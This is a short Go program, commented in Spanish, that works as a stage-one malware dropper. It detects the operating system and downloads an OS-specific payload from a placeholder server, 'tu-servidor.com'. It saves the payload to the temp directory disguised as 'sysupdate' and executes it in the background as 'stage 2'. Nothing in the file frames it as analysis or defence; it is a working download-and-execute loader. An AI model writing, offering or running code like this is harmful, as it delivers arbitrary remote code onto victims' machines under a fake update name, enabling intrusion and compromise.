// main.go
package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

func main() {
	// 1. Detectar SO para elegir el payload correcto
	osType := runtime.GOOS
	fmt.Printf("🖥️  Sistema operativo: %s\n", osType)

	// 2. Construir URL según el SO
	var payloadURL string
	switch osType {
	case "windows":
		payloadURL = "http://tu-servidor.com:8080/payload/windows"
	case "darwin":
		payloadURL = "http://tu-servidor.com:8080/payload/macos"
	case "linux":
		payloadURL = "http://tu-servidor.com:8080/payload/linux"
	default:
		fmt.Printf("⚠️  SO no soportado: %s\n", osType)
		return
	}

	fmt.Printf("📥 Descargando payload desde: %s\n", payloadURL)

	// 3. Descargar el payload
	resp, err := http.Get(payloadURL)
	if err != nil {
		fmt.Printf("❌ Error descargando: %v\n", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("❌ Error HTTP: %d\n", resp.StatusCode)
		return
	}

	// 4. Leer los datos
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("❌ Error leyendo respuesta: %v\n", err)
		return
	}

	// 5. Guardar en temp
	tempDir := os.TempDir()
	var filename string
	switch osType {
	case "windows":
		filename = "sysupdate.exe"
	case "darwin":
		filename = "sysupdate.dmg"
	case "linux":
		filename = "sysupdate.deb"
	default:
		filename = "sysupdate.bin"
	}

	path := filepath.Join(tempDir, filename)
	err = os.WriteFile(path, body, 0755)
	if err != nil {
		fmt.Printf("❌ Error guardando archivo: %v\n", err)
		return
	}

	fmt.Printf("✅ Archivo guardado en: %s\n", path)

	// 6. Ejecutar el payload
	fmt.Println("🚀 Ejecutando payload...")
	err = executePayload(path, osType)
	if err != nil {
		fmt.Printf("❌ Error ejecutando: %v\n", err)
		return
	}

	fmt.Println("✅ Stage 2 ejecutándose en background")
}

func executePayload(path string, osType string) error {
	switch osType {
	case "windows":
		// En Windows: ejecutar directamente
		cmd := exec.Command(path)
		return cmd.Start()

	case "darwin", "linux":
		// En macOS/Linux: hacer ejecutable y ejecutar en background
		err := os.Chmod(path, 0755)
		if err != nil {
			return err
		}
		cmd := exec.Command(path)
		return cmd.Start()

	default:
		return fmt.Errorf("SO no soportado para ejecución: %s", osType)
	}
}
